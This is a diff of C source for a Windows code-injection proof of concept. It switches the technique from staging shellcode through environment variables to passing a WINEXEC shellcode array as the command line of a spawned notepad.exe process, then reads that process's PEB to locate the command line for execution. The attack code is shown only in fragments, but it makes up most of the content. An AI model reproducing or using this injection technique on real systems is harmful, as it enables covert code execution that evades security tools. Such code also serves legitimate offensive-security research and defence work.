@@ -30,10 +30,7 @@
 #define UNICODE
 #include "../ntlib/util.h"
 
-#define MAX_VALUE_LEN 32767 // 0x7FFF
-#define MAX_NAME_LEN 16
-
-// get the address of environment variable value
+// get the address of command line
 PVOID get_cmdline(HANDLE hp, PDWORD cmdlen) {
     NTSTATUS                    nts;
     PROCESS_BASIC_INFORMATION   pbi;
@@ -52,7 +49,7 @@ PVOID get_cmdline(HANDLE hp, PDWORD cmdlen) {
       hp, pbi.PebBaseAddress,
       &peb, sizeof(PEB), &rd);
     
-    // get the address of Environment block 
+    // get the address of command line 
     ReadProcessMemory(
       hp, peb.ProcessParameters,
       &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &rd);
@@ -145,7 +142,7 @@ char WINEXEC[] = {
 
 #define NOTEPAD_PATH L"%SystemRoot%\\system32\\notepad.exe"
 
-void var_inject(PWCHAR cmd) {
+void cmd_inject(PWCHAR cmd) {
     STARTUPINFO         si;
     PROCESS_INFORMATION pi;
     WCHAR               path[MAX_PATH]={0};    
@@ -155,17 +152,14 @@ void var_inject(PWCHAR cmd) {
     PVOID               cmdline;
     HWND                npw, ecw;
 
-    // generate random name
     ExpandEnvironmentStrings(NOTEPAD_PATH, path, MAX_PATH);
     
-    // create a new process using 
-    // environment variables from this process
+    // create a new process using shellcode as command line
     ZeroMemory(&si, sizeof(si));
     si.cb          = sizeof(si);
     si.dwFlags     = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_SHOWDEFAULT;
     
-    // doesn't seem to work if created in suspended mode
     if(!CreateProcess(path, (PWCHAR)WINEXEC, NULL, NULL, 
       FALSE, 0, NULL, NULL, &si, &pi))
     {
@@ -175,7 +169,7 @@ void var_inject(PWCHAR cmd) {
      
     // wait for process to initialize
     // if you don't wait, there can be a race condition
-    // reading the correct Environment address from new process    
+    // reading the correct command line from new process  
     WaitForInputIdle(pi.hProcess, INFINITE);
     
     // the command to execute is just pasted into the notepad
@@ -228,7 +222,7 @@ int main(void) {
       return 0;
     }
     
-    var_inject(argv[1]);
+    cmd_inject(argv[1]);
     
     return 0;
 }
